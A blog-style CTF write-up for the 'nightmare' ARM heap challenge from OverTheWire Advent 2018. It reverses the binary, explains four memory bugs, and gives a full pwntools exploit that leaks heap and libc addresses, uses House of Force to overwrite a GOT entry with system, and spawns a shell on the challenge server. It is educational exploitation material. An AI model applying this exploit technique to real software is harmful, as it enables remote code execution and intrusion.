---
layout: post
title: "OTW Advent CTF 2018: nightmare Writeup"
date: 2018-12-26 11:15:20 -0500
comments: true
published: true
tags: ['ctf', 'writeup', 'binary', 'exploitation', 'heap', 'house of force']
---

This is a writeup for `nightmare`, the day 23 challenge for the OverTheWire Advent CTF. The problem was a 350 point ARM exploitation challenge and had 8 solves by the end of the CTF. You can find the binary and the supplied libraries [here](https://drive.google.com/open?id=1QxjQ_r1TBz2z2nhq261_-q5YFUyWve2D). In short, my solution was to overwrite the top chunk size by getting another heap chunk to overlap it, followed by using the [House of Force](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c) exploitation technique to overwite a GOT pointer to point to `system`.

<!-- more -->

## Reversing the binary

We can see that the binary is a 32-bit, stripped ARM executable
```
$ file nightmare
nightmare: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2f19e67a3f64377e99e841f8fb84d708e4884367, stripped
```

`checksec` shows the following:
```
Arch:     arm-32-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x10000)
FORTIFY:  Enabled
```

Note that RELRO is disabled. I believe my solution should work with partial RELRO, which is the default, so I'm not sure why it was disabled.

We are also supplied with the `ld-2.27.so` and `libc-2.27.so` libraries as well as a bash script that runs `qemu-arm -L ./ ./nightmare` so the binary can be run on non-ARM systems.

After running the binary with qemu, we see a menu with four options: give, get, clear, and exit. `give` will read an integer less than `0x2000` as the `size`, read `size` bytes of input, base64 encode that input (returned as a heap buffer), append the 4 byte size integer to the base64 encoded string, and then store the pointer to that string in a global `storage` array. Here's how it looks in IDA:

```c
int give()
{
  __int32 size; // r0@4
  __int16 size_; // r7@4
  int v3; // r2@4
  int v4; // r3@4
  unsigned int data_len; // r0@4
  int v6; // r7@4
  const char *encoded_str; // r0@4
  int v8; // r2@4
  const char *v9; // r6@4
  size_t v10; // r0@6
  int v11; // r3@6
  int v12; // r12@6
  __int32 size__; // [sp+0h] [bp-2020h]@4
  char data_buf[8192]; // [sp+4h] [bp-201Ch]@4
  int v15; // [sp+2004h] [bp-1Ch]@1

  v15 = 0;
  if ( storage_size > 127 )
    return _printf_chk(1, "\x1B[31;1mp00p:\x1B[0m storage full\n", (int)&v15, 0);
  size = read_size();
  size_ = size;
  size__ = size;
  _printf_chk(1, "data: ", v3, v4, size);
  *(_DWORD *)data_buf = 0;
  memset(&data_buf[4], 0, 0x1FFCu);
  data_len = _read_chk(0, data_buf, size_ & 0x1FFF, 0x2000);
  v6 = data_len;
  encoded_str = b64_encode((unsigned __int8 *)data_buf, data_len);
  v9 = encoded_str;
  if ( !*encoded_str )
    return _printf_chk(1, "\x1B[31;1mp00p:\x1B[0m cannot store data\n", v8, *(unsigned __int8 *)encoded_str);
  v10 = strlen(encoded_str);
  memcpy((void *)&v9[v10 + 1], &size__, 4u);
  v11 = storage_size;
  v12 = storage_size + 1;
  storage[storage_size] = v9;
  storage_size = v12;
  return _printf_chk(1, "\x1B[32;1mw00t:\x1B[0m %d bytes have been stored\n", v6, v11);
}
```

`get` retrieves the last thing we put into `give` (the last element of the `storage` array), base64 decodes it, and prints it out. It removes the pointer to the encoded string from the `storage` array, and puts both the decoded and encoded strings into the `items` array. Here's the decompilation:

```c
unsigned int get()
{
  unsigned __int8 *encoded_str; // r6@2
  size_t decoded_size; // r1@2
  _BYTE *decoded_str; // r0@2
  int v3; // r2@2
  _BYTE *decoded_str_; // r7@2
  int v6; // r3@5
  int new_storage_size; // r2@5
  int num_items_plus_1; // r12@5
  int v9; // [sp+0h] [bp-28h]@2
  int v10; // [sp+4h] [bp-24h]@1

  v10 = 0;
  if ( storage_size <= 0 )
    return _printf_chk(1, "\x1B[31;1mp00p:\x1B[0m storage empty\n", 0, storage_size);
  encoded_str = (unsigned __int8 *)storage[storage_size - 1];
  decoded_size = *(_DWORD *)&encoded_str[strlen((const char *)storage[storage_size - 1]) + 1];
  v9 = 0;
  decoded_str = base64_decode(encoded_str, decoded_size, &v9);
  decoded_str_ = decoded_str;
  if ( !*decoded_str )
    return _printf_chk(1, "\x1B[31;1mp00p:\x1B[0m decoding data\n", v3, 0);
  _printf_chk(1, "data: %s\n", (int)decoded_str, (unsigned __int8)*decoded_str);
  v6 = num_items;
  new_storage_size = storage_size - 1;
  num_items_plus_1 = num_items + 1;
  items[num_items] = encoded_str;
  items[num_items_plus_1] = decoded_str_;
  storage_size = new_storage_size;
  num_items = v6 + 2;
  storage[new_storage_size] = 0;
  return sleep(1u);
}
```

`clear` removes everything from the `items` array:

```c
void clear()
{
  void *item; // r0@2
  int num_cleared; // r5@3
  int v2; // r3@5

  if ( num_items <= 0 )
  {
    _printf_chk(1, "\x1B[31;1mp00p:\x1B[0m nothing to clear\n", 0, 0);
  }
  else
  {
    item = (void *)items[num_items-- - 1];
    if ( item )
    {
      num_cleared = 0;
      do
      {
        free(item);
        v2 = num_items;
        ++num_cleared;
        items[num_items] = 0;
        item = (void *)items[--v2];
        num_items = v2;
      }
      while ( item );
    }
    else
    {
      num_cleared = 0;
    }
    _printf_chk(1, "\x1B[32;1mw00t:\x1B[0m cleared %d items\n", num_cleared, 0);
  }
}
```

Now let's get into the bugs.

## Bug 1: Heap overflow in `base64_encode()`

I found a heap overflow in the `base64_encode()` function, but I did not use this bug in my final exploit. I'll still point it out here in case it could lead to a different solution. You can skip this section if you're only interested in the final solution.

The `base64_encode` function allocates a buffer for the encoded string as follows: `malloc((4 * size / 3 & 0xFF) + 4 * size / 3)`. This is a bizarre way to calculate the size, so it should raise a red flag. Also note that in the `give` function, we append a 4 byte integer to this buffer, so we need to make sure there's enough room for that.

If `size` is `192`, `4 * size / 3` will be 256, but `4 * size / 3 & 0xFF` will be zero. This means we only allocate `4 * size / 3` bytes, or 256 bytes, when our input buffer is of size 192. Because we need to append a 4 byte integer after encoding, we actually need 261 bytes instead (don't forget the null byte), so we have an overflow. However, I was not able to exploit this, as malloc(256) ended up allocating 264 bytes due to how it was implemented.

If we set `size` to `5`, then we allocate `(4 * 5 / 3 & 0xFF) + 4 * 5 / 3 = 6 + 6 = 12` bytes. However, we actually need 13 bytes. So the most significant byte of size would overwrite the least significant byte of the next heap chunks size. This bug may be exploitable, but I didn't use it.

## Bug 2: Arbitrary free in `clear()`

If you look at the implementation of `clear`, you'll see that we don't clear until the number of items is zero, we clear until the current item is a null pointer. This is obviously incorrect, and leads to `num_items` underflowing as we will be considering items before the start of our array. Let's look at what comes directly before the `items` array:

```
.bss:0002C814 storage_size    % 4                     ; DATA XREF: give+4o
.bss:0002C814                                         ; give+Cr ...
.bss:0002C818 num_items       % 4                     ; DATA XREF: clear+Cr
.bss:0002C818                                         ; clear+30w ...
.bss:0002C81C ; char input[16]
.bss:0002C81C input           % 0x10                  ; DATA XREF: main_+68o
.bss:0002C81C                                         ; .text:off_108ACo ...
.bss:0002C82C ; _DWORD items[256]
.bss:0002C82C items           % 0x400                 ; DATA XREF: get+9Co
.bss:0002C82C                                         ; .text:off_110A0o ...
.bss:0002CC2C ; _DWORD storage[128]
.bss:0002CC2C storage         % 0x200                 ; DATA XREF: give+F4o
.bss:0002CC2C                                         ; .text:off_10FA8o ...
```

`input` is the buffer we enter in command to. The code that reads that input will accept any byte other than whitespace, and only up to 15 bytes. This means we can input any 8 characters, followed by 4 null bytes, followed by any pointer we want to free, as long as the most significant byte of that pointer is zero (because we only control 15 bytes, not 16). This allows us to free almost any address by entering in a string in that format, and then calling `clear()`. We will come back to this bug.

## Bug 3: Sign mismatch bug in `read_size()` leading to allocating chunks of arbitrary sizes

We call `read_size()` in `give()` to read an integer from standard input, here are the relevant lines:

```
if ( scanf("%15[^ \t.\n]%*c", nptr) )
{
  result = strtol(nptr, 0, 10);
  v3 = result == 0;
  if ( result > 0x2000 )
    v3 = 1;
  if ( !v3 )
    break;
}
```

The code ensures that the integer is less than `0x2000`. However, `strtoul` accepts negative integers as input and returns a signed integer, so we can input `-1` here to bypass the check. In `give()`, this means we append `0xFFFFFFFF` to our base64 encoded string before storing it. When we call `get()`, we call `malloc()` using this size.

What this means is that we can call `malloc` with whatever size we want. When you see this, you should be thinking about the [House of Force](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c).

## Bug 4: No null termination in `base64_decode()` leads to heap/libc pointer leak

With the previous two bugs in mind, I had an idea of how to exploit this binary, but I wasn't sure how to bypass ASLR. Since our base64 decoded string is the only user controlled string that is output to us, I quickly checked the `base64_decode` function. I didn't bother to look at the decoding implementation closely, I simply looked for any place where we would be null terminating the string. I didn't find any, so I quickly checked in GDB whether null termination was happening and it wasn't.

When a glibc chunk is freed, the `fd`/`bk` pointers are updated to point the previous and next chunks in the free list. When a chunk is allocated with malloc, it is not zeroed out, so those pointers are still there. So if a chunk has the pointer `0xAABBCCDD`, and `base64_decode()` decodes the string 'A' into that chunk, the chunk will now contain `0xAABBCC41` (note that the LSB is overwritten but everything else is untouched). Now when we call `get()`, this string is printed and we've leaked the three most significant bytes of a heap address, which allows us to calculate the heap base and bypass ASLR for heap addresses.

When a glibc smallbin chunk is freed, the first chunk in the free list always points to some glibc pointer. So we can repeat the same attack for a smallbin chunk to leak the libc address. This allows us to find the libc base address and thus bypass ASLR for libc addresses.

## Exploitation

With the previous three bugs, it seems like house of force might be the correct approach, but we haven't been able to overwrite the top chunk size. In order to do this, I used the arbitrary free to free a fake chunk right before the top chunk (we can do this only because we have a heap leak). While I could have easily put a fake chunk there myself, I saw that 0x00000100 was reliably on the heap right before the top chunk (and this is a valid heap chunk size), so I just used that address as my chunk address. Then, when `base64_decode()` allocated a chunk it would choose this fake chunk and overwrite the top chunk address with my decoded string. Using this I set the size of the top chunk to `0xFFFFFFFF`.

With the top chunk size overwritten, the rest of the problem is standard house of force. I used the arbitrary allocation bug to allocate a chunk of size `GOT_ADDRESS - TOP_OF_HEAP`, which moved the top of the heap to the specified GOT address. The next time `base64_decode` allocates a chunk, it will be on top of the GOT, and our decoded string will overwrite the GOT. We use this to overwrite `strcmp` to the address of `system` (which we know because we have a libc leak). Finally, entering in '/bin/sh' as a command executes `system('/bin/sh')` and gives us a shell from which we can run `cat flag` to get the flag.

Here is my final exploitaiton script. This was made a lot easier by the fact that pwntools has QEMU support.

``` python
#!/usr/bin/env python2

from pwn import *

context(arch='arm', os='linux', terminal='tmux splitw -h'.split())
# p = gdb.debug('./nightmare', sysroot='./', gdbscript='''
# c
# ''')
p = remote('3.81.191.176', 1223)

# `readelf -a libc-2.27.so | grep system`
system_offset = 0x391e4

def give(size, data):
    p.sendline('give')
    p.sendline(str(size))
    p.sendline(str(data))

def get():
    p.sendline('get')

def clear():
    p.sendline('clear')

def free_addr(addr):
    a = 'A'*8 + p32(0) + p32(addr)
    a = a[:-1] + '\n'
    p.sendline(a)
    clear()

def leak_heap_base():
    for i in range(2):
        give(4, 'A'*4)
        p.recvuntil('stored')
        get()
        p.recvuntil('data:')
    clear()
    give(1, 'B')
    p.recvuntil('stored')
    get()
    p.recvuntil('data:')
    p.recvuntil('B')
    leak = p.recvline()[:-1]

    heap_base = u32(('\x00' + leak).ljust(4, '\x00'))
    return heap_base

def leak_libc_base():
    for i in range(2):
        give(600, 'AA')
        p.recvuntil('stored')
        get()
        p.recvuntil('data:')

    clear()
    for i in range(2):
        give(1, 'B')
        p.recvuntil('stored')
        get()
        p.recvuntil('data:')
    p.recvuntil('B')
    leak = p.recvline()[:-1]

    leak_offset = 0x1507f8
    libc_base = u32(leak[3:]) - leak_offset
    return libc_base

def overflow_top_chunk():
    give(-1, 'A'*191) # newline makes this 192 bytes

def main():
    # Leak the libc_base
    libc_base = leak_libc_base()
    system_addr = libc_base + system_offset
    log.info('libc_base: 0x%x' % libc_base)
    log.info('system_addr: 0x%x' % system_addr)

    # Leak the heap base
    heap_base = leak_heap_base()
    log.info('heap_base: 0x%x' % heap_base)

    # Put something in the items array so we can call clear
    give(1, 1)
    get()

    # This will call clear and put a fake chunk overlapping the top chunk
    free_addr(0x2d3c8) # We can hardcode this because ASLR is disabled and the remote server heap base matches our heap base (only when running in GDB). If ASLR was enabled we could just do some math to calculate where this would shift to
    p.recvuntil('cleared')

    # Overwrite the top chunk size
    give(0x100-6, '\xff'*8)
    p.recvuntil('stored')
    get()
    p.recvuntil('data:')

    # Now do house of force
    distance = 0x2c794 - 0x2d3cc # We can hardcode this for the same reason as above
    give(distance, '')
    p.recvuntil('stored')
    get()
    p.recvuntil('data:')

    give(1000, p32(system_addr))
    p.recvuntil('stored')
    get()
    p.recvuntil('data:')

    p.interactive()

if __name__ == '__main__':
    main()
```

One interesting I noted after solving this was that ASLR was disabled on the remote host, and it almost exactly matched what I had locally (heap addressed matched in GDB, but not outside of GDB, and libc addresses were off by a few bits). If I hadn't found the heap/libc leaks, it might have been possible to solve this problem with a bit of bruteforce instead. Also, instead of calculating the proper address to use in my code, I left in the hardcoded addresses (`0x2d3c8` and `0x2d3cc`). If ASLR was enabled, I would have simply added the right offsets the calculated `heap_base` instead.
